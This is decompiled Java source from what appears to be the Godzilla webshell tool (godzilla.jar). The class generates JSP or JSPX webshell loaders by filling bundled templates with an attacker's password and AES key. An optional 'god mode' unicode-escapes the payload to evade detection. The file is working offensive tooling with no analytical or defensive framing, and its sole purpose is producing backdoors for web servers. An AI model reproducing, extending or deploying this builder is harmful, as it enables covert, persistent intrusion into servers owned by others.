/*    */ package shells.cryptions.JavaAes;
/*    */ 
/*    */ import core.ApplicationContext;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.io.InputStream;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ class Generate
/*    */ {
/* 14 */   private static final String[] SUFFIX = new String[] { "jsp", "jspx" };
/*    */   public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
/* 16 */     byte[] data = null;
/*    */     
/*    */     try {
/* 19 */       InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
/* 20 */       String globalCode = new String(functions.readInputStream(inputStream));
/* 21 */       inputStream.close();
/* 22 */       globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
/* 23 */       inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
/* 24 */       String code = new String(functions.readInputStream(inputStream));
/* 25 */       inputStream.close();
/* 26 */       Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, (Object[])SUFFIX, null);
/* 27 */       if (selectedValue != null) {
/* 28 */         String suffix = (String)selectedValue;
/* 29 */         inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
/* 30 */         String template = new String(functions.readInputStream(inputStream));
/* 31 */         inputStream.close();
/* 32 */         if (suffix.equals(SUFFIX[1])) {
/* 33 */           globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
/* 34 */           code = code.replace("<", "&lt;").replace(">", "&gt;");
/*    */         } 
/* 36 */         if (ApplicationContext.isGodMode()) {
/* 37 */           template = template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code));
/*    */         } else {
/* 39 */           template = template.replace("{globalCode}", globalCode).replace("{code}", code);
/*    */         } 
/* 41 */         data = template.getBytes();
/*    */       }
/*    */     
/* 44 */     } catch (Exception e) {
/* 45 */       Log.error(e);
/*    */     } 
/* 47 */     return data;
/*    */   }
/*    */   
/*    */   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
/* 51 */     return GenerateShellLoder("", pass, secretKey, isBin);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\JavaAes\Generate.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */